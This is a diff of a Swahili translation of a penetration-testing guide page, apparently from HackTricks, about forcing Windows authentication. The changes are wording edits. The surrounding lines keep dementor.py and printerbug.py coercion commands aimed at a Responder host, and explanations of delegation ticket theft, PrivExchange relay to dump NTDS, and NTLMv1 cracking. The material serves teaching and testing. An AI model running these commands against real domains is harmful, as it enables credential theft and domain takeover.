@@ -39,9 +39,9 @@ au tumia [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilver
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Kuunganisha na Uwakilishi Usio na Kikomo
+### Kuunganisha na Delegation Isiyo na Kikomo
 
-Ikiwa mshambuliaji tayari ameathiri kompyuta yenye [Uwakilishi Usio na Kikomo](unconstrained-delegation.md), mshambuliaji anaweza **kufanya printer ithibitishwe dhidi ya kompyuta hii**. Kwa sababu ya uwakilishi usio na kikomo, **TGT** ya **akaunti ya kompyuta ya printer** itakuwa **imehifadhiwa katika** **kumbukumbu** ya kompyuta yenye uwakilishi usio na kikomo. Kwa kuwa mshambuliaji tayari ameathiri mwenyeji huyu, ataweza **kurejesha tiketi hii** na kuifanya itumike ([Pass the Ticket](pass-the-ticket.md)).
+Ikiwa mshambuliaji tayari ameathiri kompyuta yenye [Unconstrained Delegation](unconstrained-delegation.md), mshambuliaji anaweza **kufanya printer ithibitishe dhidi ya kompyuta hii**. Kwa sababu ya delegation isiyo na kikomo, **TGT** ya **akaunti ya kompyuta ya printer** itakuwa **imehifadhiwa katika** **kumbukumbu** ya kompyuta yenye delegation isiyo na kikomo. Kwa kuwa mshambuliaji tayari ameathiri mwenyeji huyu, ataweza **kuchukua tiketi hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Kulazimisha uthibitisho
 
@@ -53,11 +53,11 @@ https://github.com/p0dalirius/Coercer
 
 Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika **kipengele cha `PushSubscription` cha Exchange Server**. Kipengele hiki kinaruhusu server ya Exchange kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote aliyepewa na mteja kupitia HTTP.
 
-Kwa kawaida, **huduma ya Exchange inafanya kazi kama SYSTEM** na inapewa mamlaka kupita kiasi (hasa, ina **WriteDacl privileges kwenye kikoa kabla ya Sasisho la Jumla la 2019**). Kasoro hii inaweza kutumika kuweza **kupeleka habari kwa LDAP na kisha kutoa hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kupeleka kwa LDAP haiwezekani, kasoro hii bado inaweza kutumika kupeleka na kuthibitisha kwa wenyeji wengine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa haraka kwa Msimamizi wa Kikoa kwa akaunti yoyote ya mtumiaji wa kikoa iliyoidhinishwa.
+Kwa kawaida, **huduma ya Exchange inafanya kazi kama SYSTEM** na inapewa mamlaka kupita kiasi (hasa, ina **WriteDacl privileges kwenye kikoa kabla ya Sasisho la Jumla la 2019**). Kasoro hii inaweza kutumika kuweza **kupeleka taarifa kwa LDAP na kisha kutoa hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kupeleka kwa LDAP haiwezekani, kasoro hii bado inaweza kutumika kupeleka na kuthibitisha kwa wenyeji wengine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa haraka kwa Msimamizi wa Kikoa kwa akaunti yoyote ya mtumiaji wa kikoa iliyoidhinishwa.
 
 ## Ndani ya Windows
 
-Ikiwa tayari uko ndani ya mashine ya Windows unaweza kulazimisha Windows kuungana na server kwa kutumia akaunti zenye mamlaka na:
+Ikiwa tayari uko ndani ya mashine ya Windows unaweza kulazimisha Windows kuungana na server kwa kutumia akaunti zenye mamlaka na: 
 
 ### Defender MpCmdRun
 ```bash
@@ -105,6 +105,6 @@ Ikiwa unaweza kufanya shambulio la MitM kwa kompyuta na kuingiza HTML kwenye uku
 ## Cracking NTLMv1
 
 Ikiwa unaweza kukamata [NTLMv1 challenges soma hapa jinsi ya kuzivunja](../ntlm/index.html#ntlmv1-attack).\
-_&#x52;emember kwamba ili kuvunja NTLMv1 unahitaji kuweka Responder challenge kuwa "1122334455667788"_
+_Kumbuka kwamba ili kuvunja NTLMv1 unahitaji kuweka changamoto ya Responder kuwa "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
